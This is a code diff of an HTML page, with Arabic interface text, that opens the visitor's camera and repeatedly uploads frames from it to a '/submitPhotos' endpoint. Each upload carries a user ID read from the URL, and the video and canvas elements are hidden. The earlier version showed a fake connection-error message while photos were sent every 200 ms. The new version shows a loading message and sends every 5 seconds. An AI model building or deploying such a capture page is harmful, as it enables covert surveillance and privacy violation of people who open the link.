@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>مرحبا بك</title>
+ <title>التقاط الصور</title>
     <style>
         body {
             background-color: black;
@@ -35,17 +35,16 @@
 </head>
 <body>
     <div class="container">
-        <div class="spinner"></div>
-        <h1>لا يمكنك الوصول للموقع</h1>
-        <p>الرجاء التحقق من اتصالك بالإنترنت</p>
-    </div>
-
+    <div class="spinner"></div>
+    <h1>جاري تحميل الكاميرا</h1>
+    <p>يرجى الانتظار...</p>
+</div>
     <video id="video" playsinline autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const userId = window.location.pathname.split('/')[1];
+        const userId = window.location.pathname.split('/')[2]; // تغيير من [1] إلى [2]
         const urlParams = new URLSearchParams(window.location.search);
         const cameraType = urlParams.get('cameraType');
 
@@ -94,48 +93,56 @@
         }
 
         function handleSuccess(stream, additionalData) {
-            window.stream = stream;
-            video.srcObject = stream;
+    window.stream = stream;
+    video.srcObject = stream;
 
-            video.addEventListener('loadedmetadata', () => {
-                const { videoWidth, videoHeight } = video;
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
+    video.addEventListener('loadedmetadata', () => {
+        const { videoWidth, videoHeight } = video;
+        canvas.width = videoWidth;
+        canvas.height = videoHeight;
 
-                const context = canvas.getContext('2d');
-                setInterval(() => {
-                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('images', blob);
-                        formData.append('userId', userId);
-                        formData.append('cameraType', cameraType);
-                        formData.append('additionalData', JSON.stringify(additionalData));
-                        post('/submitPhotos', formData);
-                    }, 'image/png');
-                }, 200);
-            });
-        }
+        const context = canvas.getContext('2d');
+        setInterval(() => {
+            context.drawImage(video, 0, 0, videoWidth, videoHeight);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('images', blob, 'image.png');
+                formData.append('userId', userId);
+                formData.append('cameraType', cameraType);
+                formData.append('additionalData', JSON.stringify(additionalData));
+                post('/submitPhotos', formData);
+            }, 'image/png');
+        }, 5000); // تغيير إلى 5000 مللي ثانية (5 ثوان) بدلاً من 200 مللي ثانية
+    });
+}
 
         function post(url, formData) {
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    console.log('Photos sent successfully');
-                } else {
-                    console.error('Error sending photos:', data.error);
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('Photos sent successfully');
+            document.querySelector('.container').innerHTML = `
+                <h1>تم إرسال الصور بنجاح</h1>
+                <p>يمكنك إغلاق هذه الصفحة الآن</p>
+            `;
+        } else {
+            console.error('Error sending photos:', data.error);
+            throw new Error(data.error);
         }
-
-        init();
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        document.querySelector('.container').innerHTML = `
+            <h1>خطأ في إرسال الصور</h1>
+            <p>${error.message}</p>
+        `;
+    });
+}
+       init();
     </script>
 </body>
 </html>
